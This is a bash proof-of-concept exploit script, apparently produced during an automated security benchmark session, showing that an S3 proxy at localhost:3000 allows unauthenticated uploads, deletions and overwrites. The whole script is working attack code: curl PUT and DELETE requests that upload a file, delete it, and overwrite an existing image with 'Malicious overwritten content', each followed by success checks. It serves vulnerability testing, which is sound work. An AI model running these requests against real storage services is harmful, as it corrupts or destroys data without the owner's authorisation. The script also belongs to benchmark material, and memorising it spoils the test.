#!/bin/bash
# POC: Demonstrates S3 proxy unrestricted write/delete operations allowing unauthenticated users to upload, modify, and delete objects
# Target: ./repo
# Created: 2025-11-07T16:12:47.063Z
# Session: benchmark-XBEN-084-24-mhp1efma

# S3 Proxy Unrestricted Write/Delete Operations POC
# Demonstrates unauthenticated ability to write and delete objects

TARGET="http://localhost:3000"
BUCKET="assets"
TEST_FILE="poc_test_$(date +%s).txt"
TEST_DATA="Unauthorized write test data - $(date)"

echo "[*] S3 Proxy Unrestricted Write/Delete Operations POC"
echo "[*] Target: $TARGET"
echo ""

# Test 1: Unauthorized file upload (PUT)
echo "[+] Test 1: Unauthorized file upload (PUT operation)"
echo "[*] Uploading file to $BUCKET/$TEST_FILE"
RESPONSE=$(curl -s -w "\n%{http_code}" -X PUT -d "$TEST_DATA" "$TARGET/s3/$BUCKET/$TEST_FILE")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "[*] Response Code: $HTTP_CODE"
if [ "$HTTP_CODE" == "200" ]; then
    echo "[✓] File upload succeeded (HTTP 200)"
    echo "[*] Uploaded data: $TEST_DATA"
else
    echo "[✗] Unexpected response code: $HTTP_CODE"
    echo "[*] Response: $BODY"
fi
echo ""

# Test 1b: Verify file was uploaded (GET)
echo "[+] Test 1b: Verify uploaded file exists (GET operation)"
RESPONSE=$(curl -s -w "\n%{http_code}" -X GET "$TARGET/s3/$BUCKET/$TEST_FILE")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "[*] Response Code: $HTTP_CODE"
if [ "$HTTP_CODE" == "200" ]; then
    echo "[✓] File retrieved successfully (HTTP 200)"
    echo "[*] Retrieved content: $BODY"
    if [ "$BODY" == "$TEST_DATA" ]; then
        echo "[✓] File content matches uploaded data"
    fi
else
    echo "[✗] File not found or access denied (HTTP $HTTP_CODE)"
fi
echo ""

# Test 2: Unauthorized file deletion (DELETE)
echo "[+] Test 2: Unauthorized file deletion (DELETE operation)"
echo "[*] Deleting file $BUCKET/$TEST_FILE"
RESPONSE=$(curl -s -w "\n%{http_code}" -X DELETE "$TARGET/s3/$BUCKET/$TEST_FILE")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "[*] Response Code: $HTTP_CODE"
if [ "$HTTP_CODE" == "204" ] || [ "$HTTP_CODE" == "200" ]; then
    echo "[✓] File deletion succeeded (HTTP $HTTP_CODE)"
else
    echo "[✗] Unexpected response code: $HTTP_CODE"
    echo "[*] Response: $BODY"
fi
echo ""

# Test 2b: Verify file was deleted (GET)
echo "[+] Test 2b: Verify file was deleted (GET operation)"
RESPONSE=$(curl -s -w "\n%{http_code}" -X GET "$TARGET/s3/$BUCKET/$TEST_FILE")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "[*] Response Code: $HTTP_CODE"
if [ "$HTTP_CODE" == "404" ]; then
    echo "[✓] File successfully deleted (HTTP 404 - Not Found)"
else
    echo "[✗] File still exists or unexpected response (HTTP $HTTP_CODE)"
fi
echo ""

# Test 3: Demonstrate data overwrite
echo "[+] Test 3: Demonstrate data overwrite capability"
EXISTING_FILE="chris_paulman.jpg"
OVERWRITE_DATA="Malicious overwritten content"

echo "[*] Checking if file exists: $BUCKET/$EXISTING_FILE"
RESPONSE=$(curl -s -w "\n%{http_code}" -X GET "$TARGET/s3/$BUCKET/$EXISTING_FILE")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)

if [ "$HTTP_CODE" == "200" ]; then
    echo "[✓] File exists - attempting to overwrite"
    RESPONSE=$(curl -s -w "\n%{http_code}" -X PUT -d "$OVERWRITE_DATA" "$TARGET/s3/$BUCKET/$EXISTING_FILE")
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    
    if [ "$HTTP_CODE" == "200" ]; then
        echo "[✓] File overwrite succeeded (HTTP 200)"
        
        # Verify overwrite
        RESPONSE=$(curl -s -w "\n%{http_code}" -X GET "$TARGET/s3/$BUCKET/$EXISTING_FILE")
        BODY=$(echo "$RESPONSE" | sed '$d')
        HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
        
        if echo "$BODY" | grep -q "$OVERWRITE_DATA"; then
            echo "[✓] File content successfully overwritten"
        fi
    fi
else
    echo "[*] File does not exist, skipping overwrite test"
fi
echo ""

echo "[!] VULNERABILITY CONFIRMED:"
echo "    - Unauthenticated PUT operations allowed"
echo "    - Unauthenticated DELETE operations allowed"
echo "    - Data can be uploaded, modified, and deleted without authentication"
echo "    - This allows attackers to:"
echo "      * Inject malicious content"
echo "      * Corrupt existing data"
echo "      * Delete critical files and backups"
echo "      * Cause denial of service"